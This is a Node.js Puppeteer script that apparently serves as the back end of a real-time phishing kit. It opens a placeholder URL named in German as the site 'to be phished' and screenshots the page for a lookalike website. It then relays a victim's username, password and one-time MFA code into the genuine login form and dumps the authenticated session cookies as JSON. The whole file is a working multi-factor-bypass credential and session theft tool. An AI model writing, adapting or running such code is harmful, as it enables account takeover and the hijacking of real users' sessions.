const puppeteer = require('puppeteer');
const readline = require('readline');
let user = '';

(async () => {
  const browser = await puppeteer.launch({ acceptInsecureCerts: true, headless: true });
  const page = await browser.newPage();
  const screenshotfile = '../website/grafik.png';
  const screenypath = '../website/screenshots/';
  const mfscreenshotfile = '../website/mf.png';


  console.log('Puppeteer ready. Type a command (e.g. "goto https://example.com", "screenshot", or "exit")');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false
  });

  rl.on('line', async (line) => {
    const [command, ...args] = line.trim().split(' ');
    const argStr = args.join(' ');

    try {
      switch (command) {
        case 'goto':
          console.log(`Navigating to ${argStr}...`);
          await page.goto('https://url_der_zu_phishenden_webseite.de');
          console.log('Navigation complete.');

          break;

        case 'screenshot':
          console.log('Create Screenshot...');
          const screeny = screenypath + argStr;
          await page.setViewport({width: 1920, height: 1080});
          await page.screenshot({ path: screeny });
          console.log(`Screenyshot saved to ${argStr}`);
          break;

        //Input Username
        case 'user':
          console.log(`Login User: ${argStr}...`);
          user = argStr;
          break;

        //Input Password
        case 'pw':
          console.log(`pw command `);

          const resultsSelector = 'xpath=//input[@id="UserNameTextBox"]';
          await page.waitForSelector(resultsSelector);
          await page.type(resultsSelector, user);
          console.log(`user ${user}`);
          const pwSelector = 'xpath=//input[@id="PasswordTextBox"]';
          await page.type(pwSelector, argStr);
          await page.click('xpath=//button[@id="LoginButton"]');
          break;


        case 'mf':
          console.log(`mf command ${argStr}`);
          const mfSelector = 'xpath=//input[@id="LoginNewUiUserControl1_OATHTokenTextBox"]';
          await page.waitForSelector(mfSelector);
          await page.type(mfSelector, argStr);
          await page.click('xpath=//button[@id="LoginNewUiUserControl1_OATHLoginButton"]');

          await new Promise(resolve => setTimeout(resolve, 2000));
          //Cookie auslesen
          const cookies = await page.cookies();
          const cookiesString = JSON.stringify({ cookies });
          console.log(cookiesString.replaceAll('"sameSite":"Lax"','"sameSite":"lax"'));
          break;


        case 'exit':
          console.log('Closing browser...');
          await browser.close();
          rl.close();
          process.exit(0);
          break;

        default:
          console.log(`Unknown command: ${command}`);
      }
    } catch (err) {
      console.error('Error executing command:', err.message);
    }
  });
})();
